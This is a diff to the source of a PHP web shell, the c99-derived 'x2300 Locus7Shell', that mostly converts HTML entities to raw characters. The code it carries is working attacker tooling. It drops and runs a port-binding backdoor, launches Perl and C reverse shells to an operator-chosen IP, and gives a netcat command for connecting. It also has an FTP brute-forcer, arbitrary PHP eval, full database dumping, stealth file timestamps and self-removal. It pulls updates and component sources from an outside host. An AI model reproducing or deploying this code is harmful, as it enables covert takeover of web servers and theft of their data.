@@ -84,7 +84,7 @@ if (!function_exists("myshellexec"))
 {
 if(is_callable("popen")){
 function myshellexec($command) {
-if (!($p=popen("($command)2&gt;&1","r"))) {
+if (!($p=popen("($command)2>&1","r"))) {
 return 126;
 }
 while (!feof($p)) {
@@ -124,9 +124,9 @@ function checkproxyhost(){
 $host = getenv("HTTP_HOST");
 $filename = '/tmp/.setan/xh';
 if (file_exists($filename)) {
-$_POST['proxyhostmsg']="&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;font color=green size=3&gt;&lt;b&gt;Success!&lt;/b&gt;&lt;/font&gt;&lt;/br&gt;&lt;/br&gt;&lt;a href=$host:6543&gt;$host:6543&lt;/a&gt;&lt;/br&gt;&lt;/br&gt;&lt;b&gt;Note:&lt;/b&gt; If '$host' have a good firewall or IDS  installed on their server, it will probably catch this or stop it from ever opening a port and you won't be able to connect to this proxy.&lt;/br&gt;&lt;/br&gt;&lt;/center&gt;";
+$_POST['proxyhostmsg']="</br></br><center><font color=green size=3><b>Success!</b></font></br></br><a href=$host:6543>$host:6543</a></br></br><b>Note:</b> If '$host' have a good firewall or IDS  installed on their server, it will probably catch this or stop it from ever opening a port and you won't be able to connect to this proxy.</br></br></center>";
 } else {
-$_POST['proxyhostmsg']="&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;font color=red size=3&gt;&lt;b&gt;Failed!&lt;/b&gt;&lt;/font&gt;&lt;/br&gt;&lt;/br&gt;&lt;b&gt;Note:&lt;/b&gt; If for some reason we would not create and extract the need proxy files in '/tmp' this will make this fail.&lt;/br&gt;&lt;/br&gt;&lt;/center&gt;";
+$_POST['proxyhostmsg']="</br></br><center><font color=red size=3><b>Failed!</b></font></br></br><b>Note:</b> If for some reason we would not create and extract the need proxy files in '/tmp' this will make this fail.</br></br></center>";
 }
 }
 if (!empty($_POST['backconnectport']) && ($_POST['use']=="shbd"))
@@ -137,18 +137,18 @@ if(is_writable(".")){
 cfb("shbd",$backdoor);
 ex("chmod 777 shbd");
 $cmd = "./shbd $por";
-exec("$cmd &gt; /dev/null &");
+exec("$cmd > /dev/null &");
 $scan = myshellexec("ps aux");
-if(eregi("./shbd $por",$scan)){ $data = ("\n&lt;/br&gt;&lt;/br&gt;Process found running, backdoor setup successfully."); }elseif(eregi("./shbd $por",$scan)){ $data = ("\n&lt;/br&gt;Process not found running, backdoor not setup successfully."); }
-$_POST['backcconnmsg']="To connect, use netcat and give it the command &lt;b&gt;'nc $ip $por'&lt;/b&gt;.$data";
+if(eregi("./shbd $por",$scan)){ $data = ("\n</br></br>Process found running, backdoor setup successfully."); }elseif(eregi("./shbd $por",$scan)){ $data = ("\n</br>Process not found running, backdoor not setup successfully."); }
+$_POST['backcconnmsg']="To connect, use netcat and give it the command <b>'nc $ip $por'</b>.$data";
 }else{
 cfb("/tmp/shbd",$backdoor);
 ex("chmod 777 /tmp/shbd");
 $cmd = "./tmp/shbd $por";
-exec("$cmd &gt; /dev/null &");
+exec("$cmd > /dev/null &");
 $scan = myshellexec("ps aux");
-if(eregi("./shbd $por",$scan)){ $data = ("\n&lt;/br&gt;&lt;/br&gt;Process found running, backdoor setup successfully."); }elseif(eregi("./shbd $por",$scan)){ $data = ("\n&lt;/br&gt;Process not found running, backdoor not setup successfully."); }
-$_POST['backcconnmsg']="To connect, use netcat and give it the command &lt;b&gt;'nc $ip $por'&lt;/b&gt;.$data";
+if(eregi("./shbd $por",$scan)){ $data = ("\n</br></br>Process found running, backdoor setup successfully."); }elseif(eregi("./shbd $por",$scan)){ $data = ("\n</br>Process not found running, backdoor not setup successfully."); }
+$_POST['backcconnmsg']="To connect, use netcat and give it the command <b>'nc $ip $por'</b>.$data";
 }
 }
 if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ($_POST['use']=="Perl"))
@@ -157,13 +157,13 @@ if(is_writable(".")){
 cf("back",$back_connect);
 $p2=which("perl");
 $blah = ex($p2." back ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
-$_POST['backcconnmsg']="Trying to connect to &lt;b&gt;".$_POST['backconnectip']."&lt;/b&gt; on port &lt;b&gt;".$_POST['backconnectport']."&lt;/b&gt;.";
+$_POST['backcconnmsg']="Trying to connect to <b>".$_POST['backconnectip']."</b> on port <b>".$_POST['backconnectport']."</b>.";
 if (file_exists("back")) { unlink("back"); }
 }else{
 cf("/tmp/back",$back_connect);
 $p2=which("perl");
 $blah = ex($p2." /tmp/back ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
-$_POST['backcconnmsg']="Trying to connect to &lt;b&gt;".$_POST['backconnectip']."&lt;/b&gt; on port &lt;b&gt;".$_POST['backconnectport']."&lt;/b&gt;.";
+$_POST['backcconnmsg']="Trying to connect to <b>".$_POST['backconnectip']."</b> on port <b>".$_POST['backconnectport']."</b>.";
 if (file_exists("/tmp/back")) { unlink("/tmp/back"); }
 }
 }
@@ -174,7 +174,7 @@ cf("backc",$back_connect_c);
 ex("chmod 777 backc");
 //$blah = ex("gcc back.c -o backc");
 $blah = ex("./backc ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
-$_POST['backcconnmsg']="Trying to connect to &lt;b&gt;".$_POST['backconnectip']."&lt;/b&gt; on port &lt;b&gt;".$_POST['backconnectport']."&lt;/b&gt;.";
+$_POST['backcconnmsg']="Trying to connect to <b>".$_POST['backconnectip']."</b> on port <b>".$_POST['backconnectport']."</b>.";
 //if (file_exists("back.c")) { unlink("back.c"); }
 if (file_exists("backc")) { unlink("backc"); }
 }else{
@@ -182,7 +182,7 @@ ex("chmod 777 /tmp/backc");
 cf("/tmp/backc",$back_connect_c);
 //$blah = ex("gcc -o /tmp/backc /tmp/back.c");
 $blah = ex("/tmp/backc ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
-$_POST['backcconnmsg']="Trying to connect to &lt;b&gt;".$_POST['backconnectip']."&lt;/b&gt; on port &lt;b&gt;".$_POST['backconnectport']."&lt;/b&gt;.";
+$_POST['backcconnmsg']="Trying to connect to <b>".$_POST['backconnectip']."</b> on port <b>".$_POST['backconnectport']."</b>.";
 //if (file_exists("back.c")) { unlink("back.c"); }
 if (file_exists("/tmp/backc")) { unlink("/tmp/backc"); } }
 }
@@ -206,11 +206,11 @@ if($w_file)
 }
 function err()
 {
-$_POST['backcconnmsge']="&lt;/br&gt;&lt;/br&gt;&lt;b&gt;&lt;font color=red size=3&gt;Error:&lt;/font&gt; Can't connect!&lt;/b&gt;";
+$_POST['backcconnmsge']="</br></br><b><font color=red size=3>Error:</font> Can't connect!</b>";
 }
 function bberr()
 {
-$_POST['backcconnmsge']="&lt;/br&gt;&lt;/br&gt;&lt;b&gt;&lt;font color=red size=3&gt;Error:&lt;/font&gt; Can't backdoor host!&lt;/b&gt;";
+$_POST['backcconnmsge']="</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>";
 }
 function which($pr)
 {
@@ -272,9 +272,9 @@ $adires="";
 @set_magic_quotes_runtime(0);
 $win = strtolower(substr(PHP_OS,0,3)) == "win";
 define("starttime",getmicrotime());
-if (get_magic_quotes_gpc()) {if (!function_exists("strips")) {function strips(&$arr,$k="") {if (is_array($arr)) {foreach($arr as $k=&gt;$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}} else {$arr = stripslashes($arr);}}} strips($GLOBALS);}
+if (get_magic_quotes_gpc()) {if (!function_exists("strips")) {function strips(&$arr,$k="") {if (is_array($arr)) {foreach($arr as $k=>$v) {if (strtoupper($k) != "GLOBALS") {strips($arr["$k"]);}}} else {$arr = stripslashes($arr);}}} strips($GLOBALS);}
 $_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
-foreach($_REQUEST as $k=&gt;$v) {if (!isset($$k)) {$$k = $v;}}
+foreach($_REQUEST as $k=>$v) {if (!isset($$k)) {$$k = $v;}}
 $shver = "1.0a beta"; //Current version
 //CONFIGURATION AND SETTINGS
 if (!empty($unset_surl)) {setcookie("c99sh_surl"); $surl = "";}
@@ -296,13 +296,13 @@ $pass = ""; //password
 $md5_pass = ""; //md5-cryped pass. if null, md5($pass)
 $host_allow = array("*"); //array ("{mask}1","{mask}2",...), {mask} = IP or HOST e.g. array("192.168.0.*","127.0.0.1")
 $login_txt = "Restricted area"; //http-auth message.
-$accessdeniedmess = "&lt;a href=\"http://locus7s.com\"&gt;x2300 Locus7Shell v.".$shver."&lt;/a&gt;: access denied";
+$accessdeniedmess = "<a href=\"http://locus7s.com\">x2300 Locus7Shell v.".$shver."</a>: access denied";
 $gzipencode = TRUE; //Encode with gzip?
 $updatenow = FALSE; //If TRUE, update now (this variable will be FALSE)
 $c99sh_updateurl = "http://locus7s.com/files/lshell_update/"; //Update server
 $c99sh_sourcesurl = "http://locus7s.com/"; //Sources-server
 $filestealth = TRUE; //if TRUE, don't change modify- and access-time
-$donated_html = "&lt;center&gt;&lt;b&gt;x2300 Locus7Shell Modified by #!physx^ &lt;/b&gt;&lt;/center&gt;";
+$donated_html = "<center><b>x2300 Locus7Shell Modified by #!physx^ </b></center>";
 /* If you publish free shell and you wish
 add link to your site or any other information,
 put here your html. */
@@ -316,24 +316,24 @@ $sort_default = "0a"; //Default sorting, 0 - number of colomn, "a"scending or "d
 $sort_save = TRUE; //If TRUE then save sorting-position using cookies.
 // Registered file-types.
 //  array(
-//   "{action1}"=&gt;array("ext1","ext2","ext3",...),
-//   "{action2}"=&gt;array("ext4","ext5","ext6",...),
+//   "{action1}"=>array("ext1","ext2","ext3",...),
+//   "{action2}"=>array("ext4","ext5","ext6",...),
 //   ...
 //  )
 $ftypes  = array(
-"html"=&gt;array("html","htm","shtml"),
-"txt"=&gt;array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),
-"exe"=&gt;array("sh","install","bat","cmd"),
-"ini"=&gt;array("ini","inf"),
-"code"=&gt;array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"),
-"img"=&gt;array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
-"sdb"=&gt;array("sdb"),
-"phpsess"=&gt;array("sess"),
-"download"=&gt;array("exe","com","pif","src","lnk","zip","rar","gz","tar")
+"html"=>array("html","htm","shtml"),
+"txt"=>array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),
+"exe"=>array("sh","install","bat","cmd"),
+"ini"=>array("ini","inf"),
+"code"=>array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"),
+"img"=>array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
+"sdb"=>array("sdb"),
+"phpsess"=>array("sess"),
+"download"=>array("exe","com","pif","src","lnk","zip","rar","gz","tar")
 );
 // Registered executable file-types.
 //  array(
-//   string "command{i}"=&gt;array("ext1","ext2","ext3",...),
+//   string "command{i}"=>array("ext1","ext2","ext3",...),
 //   ...
 //  )
 //   {command}: %f% = filename
@@ -359,28 +359,28 @@ function dosyayicek($link,$file)
    fclose($fp2);
 }
 $exeftypes  = array(
-getenv("PHPRC")." -q %f%" =&gt; array("php","php3","php4"),
-"perl %f%" =&gt; array("pl","cgi")
+getenv("PHPRC")." -q %f%" => array("php","php3","php4"),
+"perl %f%" => array("pl","cgi")
 );
 /* Highlighted files.
   array(
-   i=&gt;array({regexp},{type},{opentag},{closetag},{break})
+   i=>array({regexp},{type},{opentag},{closetag},{break})
    ...
   )
   string {regexp} - regular exp.
   int {type}:
 0 - files and folders (as default),
 1 - files only, 2 - folders only
-  string {opentag} - open html-tag, e.g. "&lt;b&gt;" (default)
-  string {closetag} - close html-tag, e.g. "&lt;/b&gt;" (default)
+  string {opentag} - open html-tag, e.g. "<b>" (default)
+  string {closetag} - close html-tag, e.g. "</b>" (default)
   bool {break} - if TRUE and found match then break
 */
 $regxp_highlight  = array(
-  array(basename($_SERVER["PHP_SELF"]),1,"&lt;font color=\"yellow\"&gt;","&lt;/font&gt;"), // example
+  array(basename($_SERVER["PHP_SELF"]),1,"<font color=\"yellow\">","</font>"), // example
   array("config.php",1) // example
 );
 $safemode_diskettes = array("a"); // This variable for disabling diskett-errors.
-// array (i=&gt;{letter} ...); string {letter} - letter of a drive
+// array (i=>{letter} ...); string {letter} - letter of a drive
 //$safemode_diskettes = range("a","z");
 $hexdump_lines = 8;// lines in hex preview file
 $hexdump_rows = 24;// 16, 24 or 32 bytes in one line
@@ -434,26 +434,26 @@ $usefsbuff = TRUE; //Buffer-function
 $copy_unset = FALSE; //Remove copied files from buffer after pasting
 //Quick launch
 $quicklaunch = array(
-array("&lt;img src=\"".$surl."act=img&img=home\" alt=\"Home\" height=\"20\" width=\"20\" border=\"0\"&gt;",$surl),
-array("&lt;img src=\"".$surl."act=img&img=back\" alt=\"Back\" height=\"20\" width=\"20\" border=\"0\"&gt;","#\" onclick=\"history.back(1)"),
-array("&lt;img src=\"".$surl."act=img&img=forward\" alt=\"Forward\" height=\"20\" width=\"20\" border=\"0\"&gt;","#\" onclick=\"history.go(1)"),
-array("&lt;img src=\"".$surl."act=img&img=up\" alt=\"UPDIR\" height=\"20\" width=\"20\" border=\"0\"&gt;",$surl."act=ls&d=%upd&sort=%sort"),
-array("&lt;img src=\"".$surl."act=img&img=refresh\" alt=\"Refresh\" height=\"20\" width=\"17\" border=\"0\"&gt;",""),
-array("&lt;img src=\"".$surl."act=img&img=search\" alt=\"Search\" height=\"20\" width=\"20\" border=\"0\"&gt;",$surl."act=search&d=%d"),
-array("&lt;img src=\"".$surl."act=img&img=buffer\" alt=\"Buffer\" height=\"20\" width=\"20\" border=\"0\"&gt;",$surl."act=fsbuff&d=%d"),
-array("&lt;br&gt;&lt;center&gt;&lt;b&gt;[Enumerate]&lt;/b&gt;",$enumerate),
-array("&lt;b&gt;[Encoder]&lt;/b&gt;",$surl."act=encoder&d=%d"),
-array("&lt;b&gt;[Tools]&lt;/b&gt;",$surl."act=tools&d=%d"),
-array("&lt;b&gt;[Proc.]&lt;/b&gt;",$surl."act=processes&d=%d"),
-array("&lt;b&gt;[FTP Brute]&lt;/b&gt;",$surl."act=ftpquickbrute&d=%d"),
-array("&lt;b&gt;[Sec.]&lt;/b&gt;",$surl."act=security&d=%d"),
-array("&lt;b&gt;[SQL]&lt;/b&gt;",$surl."act=sql&d=%d"),
-array("&lt;b&gt;[PHP-Code]&lt;/b&gt;",$surl."act=eval&d=%d"),
-array("&lt;b&gt;[Backdoor Host]&lt;/b&gt;",$surl."act=shbd"),
-array("&lt;b&gt;[Back-Connection]&lt;/b&gt;",$surl."act=backc"),
-array("&lt;b&gt;[milw0rm it!]&lt;/b&gt;",$millink),
-array("&lt;b&gt;[PHP-Proxy]&lt;/b&gt;",$phprox),
-array("&lt;b&gt;[Self remove]&lt;/b&gt;&lt;/center&gt;",$surl."act=selfremove")
+array("<img src=\"".$surl."act=img&img=home\" alt=\"Home\" height=\"20\" width=\"20\" border=\"0\">",$surl),
+array("<img src=\"".$surl."act=img&img=back\" alt=\"Back\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.back(1)"),
+array("<img src=\"".$surl."act=img&img=forward\" alt=\"Forward\" height=\"20\" width=\"20\" border=\"0\">","#\" onclick=\"history.go(1)"),
+array("<img src=\"".$surl."act=img&img=up\" alt=\"UPDIR\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=ls&d=%upd&sort=%sort"),
+array("<img src=\"".$surl."act=img&img=refresh\" alt=\"Refresh\" height=\"20\" width=\"17\" border=\"0\">",""),
+array("<img src=\"".$surl."act=img&img=search\" alt=\"Search\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=search&d=%d"),
+array("<img src=\"".$surl."act=img&img=buffer\" alt=\"Buffer\" height=\"20\" width=\"20\" border=\"0\">",$surl."act=fsbuff&d=%d"),
+array("<br><center><b>[Enumerate]</b>",$enumerate),
+array("<b>[Encoder]</b>",$surl."act=encoder&d=%d"),
+array("<b>[Tools]</b>",$surl."act=tools&d=%d"),
+array("<b>[Proc.]</b>",$surl."act=processes&d=%d"),
+array("<b>[FTP Brute]</b>",$surl."act=ftpquickbrute&d=%d"),
+array("<b>[Sec.]</b>",$surl."act=security&d=%d"),
+array("<b>[SQL]</b>",$surl."act=sql&d=%d"),
+array("<b>[PHP-Code]</b>",$surl."act=eval&d=%d"),
+array("<b>[Backdoor Host]</b>",$surl."act=shbd"),
+array("<b>[Back-Connection]</b>",$surl."act=backc"),
+array("<b>[milw0rm it!]</b>",$millink),
+array("<b>[PHP-Proxy]</b>",$phprox),
+array("<b>[Self remove]</b></center>",$surl."act=selfremove")
 );
 //Highlight-code colors
 $highlight_background = "#c0c0c0";
@@ -520,23 +520,23 @@ if($w_file)
 }*/
 /*function err($n,$txt='')
 {
-echo '&lt;table width=100% cellpadding=0 cellspacing=0&gt;&lt;tr&gt;&lt;td bgcolor=#000000&gt;&lt;font color=red face=Verdana size=-2&gt;&lt;div align=center&gt;&lt;b&gt;';     
+echo '<table width=100% cellpadding=0 cellspacing=0><tr><td bgcolor=#000000><font color=red face=Verdana size=-2><div align=center><b>';     
 echo $GLOBALS['lang'][$GLOBALS['language'].'_err'.$n];
 if(!empty($txt)) { echo " $txt"; }
-echo '&lt;/b&gt;&lt;/div&gt;&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;';
+echo '</b></div></font></td></tr></table>';
 return null;
 }*/
 @set_time_limit(0);
 $tmp = array();
-foreach($host_allow as $k=&gt;$v) {$tmp[] = str_replace("\\*",".*",preg_quote($v));}
+foreach($host_allow as $k=>$v) {$tmp[] = str_replace("\\*",".*",preg_quote($v));}
 $s = "!^(".implode("|",$tmp).")$!i";
-if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("&lt;a href=\"http://locus7s.com/\"&gt;x2300 Shell&lt;/a&gt;: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}
+if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {exit("<a href=\"http://locus7s.com/\">x2300 Shell</a>: Access Denied - your host (".getenv("REMOTE_ADDR").") not allow");}
 if (!empty($login))
 {
 if (empty($md5_pass)) {$md5_pass = md5($pass);}
 if (($_SERVER["PHP_AUTH_USER"] != $login) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
 {
-  if (empty($login_txt)) {$login_txt = strip_tags(ereg_replace("&nbsp;|&lt;br&gt;"," ",$donated_html));}
+  if (empty($login_txt)) {$login_txt = strip_tags(ereg_replace("&nbsp;|<br>"," ",$donated_html));}
   header("WWW-Authenticate: Basic realm=\"c99shell ".$shver.": ".$login_txt."\"");
   header("HTTP/1.0 401 Unauthorized");
   exit($accessdeniedmess);
@@ -563,14 +563,14 @@ function c99_buff_prepare()
 {
 global $sess_data;
 global $act;
-foreach($sess_data["copy"] as $k=&gt;$v) {$sess_data["copy"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
-foreach($sess_data["cut"] as $k=&gt;$v) {$sess_data["cut"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
+foreach($sess_data["copy"] as $k=>$v) {$sess_data["copy"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
+foreach($sess_data["cut"] as $k=>$v) {$sess_data["cut"][$k] = str_replace("\\",DIRECTORY_SEPARATOR,realpath($v));}
 $sess_data["copy"] = array_unique($sess_data["copy"]);
 $sess_data["cut"] = array_unique($sess_data["cut"]);
 sort($sess_data["copy"]);
 sort($sess_data["cut"]);
-if ($act != "copy") {foreach($sess_data["cut"] as $k=&gt;$v) {if ($sess_data["copy"][$k] == $v) {unset($sess_data["copy"][$k]); }}}
-else {foreach($sess_data["copy"] as $k=&gt;$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}}
+if ($act != "copy") {foreach($sess_data["cut"] as $k=>$v) {if ($sess_data["copy"][$k] == $v) {unset($sess_data["copy"][$k]); }}}
+else {foreach($sess_data["copy"] as $k=>$v) {if ($sess_data["cut"][$k] == $v) {unset($sess_data["cut"][$k]);}}}
 }
 }
 c99_buff_prepare();
@@ -600,7 +600,7 @@ if (!function_exists("str2mini"))
 {
 function str2mini($content,$len)
 {
-if (strlen($content) &gt; $len)
+if (strlen($content) > $len)
 {
   $len = ceil($len/2) - 2;
   return substr($content, 0,$len)."...".substr($content,-$len);
@@ -615,9 +615,9 @@ function view_size($size)
 if (!is_numeric($size)) {return FALSE;}
 else
 {
-  if ($size &gt;= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
-  elseif ($size &gt;= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
-  elseif ($size &gt;= 1024) {$size = round($size/1024*100)/100 ." KB";}
+  if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
+  elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
+  elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}
   else {$size = $size . " B";}
   return $size;
 }
@@ -797,10 +797,10 @@ elseif (($mode & 0x6000) === 0x6000) {$t = "b";}
 elseif (($mode & 0x2000) === 0x2000) {$t = "c";}
 elseif (($mode & 0x1000) === 0x1000) {$t = "p";}
 else {$t = "?";}
-$o["r"] = ($mode & 00400) &gt; 0; $o["w"] = ($mode & 00200) &gt; 0; $o["x"] = ($mode & 00100) &gt; 0;
-$g["r"] = ($mode & 00040) &gt; 0; $g["w"] = ($mode & 00020) &gt; 0; $g["x"] = ($mode & 00010) &gt; 0;
-$w["r"] = ($mode & 00004) &gt; 0; $w["w"] = ($mode & 00002) &gt; 0; $w["x"] = ($mode & 00001) &gt; 0;
-return array("t"=&gt;$t,"o"=&gt;$o,"g"=&gt;$g,"w"=&gt;$w);
+$o["r"] = ($mode & 00400) > 0; $o["w"] = ($mode & 00200) > 0; $o["x"] = ($mode & 00100) > 0;
+$g["r"] = ($mode & 00040) > 0; $g["w"] = ($mode & 00020) > 0; $g["x"] = ($mode & 00010) > 0;
+$w["r"] = ($mode & 00004) > 0; $w["w"] = ($mode & 00002) > 0; $w["x"] = ($mode & 00001) > 0;
+return array("t"=>$t,"o"=>$o,"g"=>$g,"w"=>$w);
 }
 }
 if (!function_exists("parsesort"))
@@ -817,9 +817,9 @@ if (!function_exists("view_perms_color"))
 {
 function view_perms_color($o)
 {
-if (!is_readable($o)) {return "&lt;font color=red&gt;".view_perms(fileperms($o))."&lt;/font&gt;";}
-elseif (!is_writable($o)) {return "&lt;font color=white&gt;".view_perms(fileperms($o))."&lt;/font&gt;";}
-else {return "&lt;font color=green&gt;".view_perms(fileperms($o))."&lt;/font&gt;";}
+if (!is_readable($o)) {return "<font color=red>".view_perms(fileperms($o))."</font>";}
+elseif (!is_writable($o)) {return "<font color=white>".view_perms(fileperms($o))."</font>";}
+else {return "<font color=green>".view_perms(fileperms($o))."</font>";}
 }
 }
 if (!function_exists("c99getsource"))
@@ -828,12 +828,12 @@ function c99getsource($fn)
 {
 global $c99sh_sourcesurl;
 $array = array(
-  "c99sh_bindport.pl" =&gt; "c99sh_bindport_pl.txt",
-  "c99sh_bindport.c" =&gt; "c99sh_bindport_c.txt",
-  "c99sh_backconn.pl" =&gt; "c99sh_backconn_pl.txt",
-  "c99sh_backconn.c" =&gt; "c99sh_backconn_c.txt",
-  "c99sh_datapipe.pl" =&gt; "c99sh_datapipe_pl.txt",
-  "c99sh_datapipe.c" =&gt; "c99sh_datapipe_c.txt",
+  "c99sh_bindport.pl" => "c99sh_bindport_pl.txt",
+  "c99sh_bindport.c" => "c99sh_bindport_c.txt",
+  "c99sh_backconn.pl" => "c99sh_backconn_pl.txt",
+  "c99sh_backconn.c" => "c99sh_backconn_c.txt",
+  "c99sh_datapipe.pl" => "c99sh_datapipe_pl.txt",
+  "c99sh_datapipe.c" => "c99sh_datapipe_c.txt",
 );
 $name = $array[$fn];
 if ($name) {return file_get_contents($c99sh_sourcesurl.$name);}
@@ -865,7 +865,7 @@ else
     else
     {
      $fp = fopen(__FILE__,"w");
-     if (!$fp) {return "Local error: can't write update to ".__FILE__."! You may download c99shell.php manually &lt;a href=\"".$sourceurl."\"&gt;&lt;u&gt;here&lt;/u&gt;&lt;/a&gt;.";}
+     if (!$fp) {return "Local error: can't write update to ".__FILE__."! You may download c99shell.php manually <a href=\"".$sourceurl."\"><u>here</u></a>.";}
      else {fwrite($fp,$source); fclose($fp); return "Thanks! Updated with success.";}
     }
    }
@@ -906,7 +906,7 @@ if (sizeof($tabs) == 0)
 {
   // retrive tables-list
   $res = mysql_query("SHOW TABLES FROM ".$db, $sock);
-  if (mysql_num_rows($res) &gt; 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
+  if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
 }
 $out = "# Dumped by Locous7Shell.SQL v. ".$shver."
 # Home page: http://www.Locus7s.com
@@ -932,13 +932,13 @@ foreach($tabs as $tab)
     $out .= $row["1"].";\n\n";
     // recieve table variables
     $res = mysql_query("SELECT * FROM `$tab`", $sock);
-    if (mysql_num_rows($res) &gt; 0)
+    if (mysql_num_rows($res) > 0)
     {
      while ($row = mysql_fetch_assoc($res))
      {
       $keys = implode("`, `", array_keys($row));
       $values = array_values($row);
-      foreach($values as $k=&gt;$v) {$values[$k] = addslashes($v);}
+      foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
       $values = implode("', '", $values);
       $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n";
       $out .= $sql;
@@ -968,7 +968,7 @@ function mysql_buildwhere($array,$sep=" and",$functs=array())
 {
 if (!is_array($array)) {$array = array();}
 $result = "";
-foreach($array as $k=&gt;$v)
+foreach($array as $k=>$v)
 {
   $value = "";
   if (!empty($functs[$k])) {$value .= $functs[$k]."(";}
@@ -1007,16 +1007,16 @@ if (!function_exists("mysql_query_form"))
 function mysql_query_form()
 {
 global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
-if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "&lt;b&gt;Error:&lt;/b&gt; &lt;br&gt;".$sql_query_error."&lt;br&gt;";}
+if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
 if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
 if ((!$submit) or ($sql_act))
 {
-  echo "&lt;table border=0&gt;&lt;tr&gt;&lt;td&gt;&lt;form name=\"c99sh_sqlquery\" method=POST&gt;&lt;b&gt;"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;textarea name=sql_query cols=100 rows=10&gt;".htmlspecialchars($sql_query)."&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;input type=hidden name=act value=sql&gt;&lt;input type=hidden name=sql_act value=query&gt;&lt;input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;input type=hidden name=submit value=\"1\"&gt;&lt;input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"&gt;&lt;input type=submit name=sql_confirm value=\"Yes\"&gt;&nbsp;&lt;input type=submit value=\"No\"&gt;&lt;/form&gt;&lt;/td&gt;";
+  echo "<table border=0><tr><td><form name=\"c99sh_sqlquery\" method=POST><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=act value=sql><input type=hidden name=sql_act value=query><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=sql_confirm value=\"Yes\">&nbsp;<input type=submit value=\"No\"></form></td>";
   if ($tbl_struct)
   {
-   echo "&lt;td valign=\"top\"&gt;&lt;b&gt;Fields:&lt;/b&gt;&lt;br&gt;";
-   foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "+ &lt;a href=\"#\" onclick=\"document.c99sh_sqlquery.sql_query.value+='`".$name."`';\"&gt;&lt;b&gt;".$name."&lt;/b&gt;&lt;/a&gt;&lt;br&gt;";}
-   echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+   echo "<td valign=\"top\"><b>Fields:</b><br>";
+   foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "+ <a href=\"#\" onclick=\"document.c99sh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
+   echo "</td></tr></table>";
   }
 }
 if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}
@@ -1039,7 +1039,7 @@ $query = trim($query);
 $arr = explode (" ",$query);
 /*array array()
 {
-  "METHOD"=&gt;array(output_type),
+  "METHOD"=>array(output_type),
   "METHOD1"...
   ...
 }
@@ -1049,10 +1049,10 @@ if output_type == 2, output without control-buttons
 if output_type == 3, output with control-buttons
 */
 $types = array(
-  "SELECT"=&gt;array(3,1),
-  "SHOW"=&gt;array(2,1),
-  "DELETE"=&gt;array(1),
-  "DROP"=&gt;array(1)
+  "SELECT"=>array(3,1),
+  "SHOW"=>array(2,1),
+  "DELETE"=>array(1),
+  "DROP"=>array(1)
 );
 $result = array();
 $op = strtoupper($arr[0]);
